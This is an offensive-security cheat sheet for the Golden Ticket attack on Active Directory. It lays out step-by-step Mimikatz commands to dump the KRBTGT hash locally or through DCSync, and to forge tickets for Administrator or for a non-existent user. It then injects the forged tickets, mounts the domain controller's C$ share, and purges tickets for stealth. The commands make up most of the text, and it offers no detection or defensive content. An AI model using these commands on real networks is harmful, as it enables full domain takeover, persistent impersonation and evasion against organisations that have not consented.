## Golden Ticket Attack (Kerberos Abuse)

### Overview

A *8Golden Ticket Attack** exploits the kerberos authentication system in Active Directory (AD) by forging Ticket Granting Tickets (TGTs) using the KRBTGT account's password hash.

The **KRBTGT** account is critical because it signs and encrypts kerberos tickets. If compromised, attackers can generate TGTs for any identity, with any privileges, at will - gaining total control over AD authentication

---

### Attack Workflow

#### 1. Obtai KRBTGT Password hash

* Goal : Extract NTLM or AES password hash of the **KRBTGT** account.
* Tool : Mimikatz

```cmd
mimikatz.exe
```

```cmd
privilege::debug
```

```cmd
lsadump::lsa /inject /name:krbtgt
```

alternatively (over the network):

```cmd
lsadump::dcsync /user:DOMAIN\krbtgt
```

#### 2. Extract Domain Information

Retrieve :

* Domain FQDN
* Domain SID

#### 3. Generate a Golden Ticket

Craft the Golden Ticket using ``kerberos::golden``

Required Parameters:

* ``/domain`` : FQDN of the domain
* ``/sid`` : Domain SID
* ``/krbtgt`` or ``/aes256`` : Hash of the KRBTGT account
* ``/user`` : Username to impersonate
* ``/id`` : RID of the user (e.g. 500 for administrator)
* ``/groups`` : (optional) Group RIDs to assign
* ``/ptt`` : (Optional) Inject ticket directly into memory

Examples:

Forge and export to a ``.kirbi`` file:

```cmd
kerberos::golden /user:Administrator /domain:infosecwarrior.local /sid:<SID> /krbtgt:<Hash> /id:500 /groups:513
```

Forge and inject immediately (PtT attack)

```cmd
kerberos::golden /user:Administrator /domain:infosecwarrior.local /sid:<SID> /krbtgt:<Hash> /id:500 /ptt
```

Another forging example (for a non-existing user)

```cmd
kerberos::golden /domain:infosecwarrior.local /sid:<SID> /aes256:<Hash> /user:NonExistentUser /groups:513,2668 /ptt
```

---

### 4. Pass-the-Ticket (PtT) Attack

With the Golden ticket in hand, the attacker performs a Pass-the-Ticket(PtT) attack. This involves loadingthe forged ticket into the currentsession, essentially impersonating any user and gaining access to resources connected to Active Directory.

**Access to any resource**: once the golden ticket is loaded into the session, the attacker can access any resources within the compromised Active Directory enviornment. This includes systems, services and data, effectively bypassing normal authentication mechanisms

After ticket injection

```cmd
misc::cmd
```

* list Kerberos tickets

```cmd
klist
```

```cmd
net use K: \\dc.infosecwarrior.local\C$
```

---

### 5. Clear Kerberos Tickets

(Optional, for stealthiness)

```cmd
klist purge
```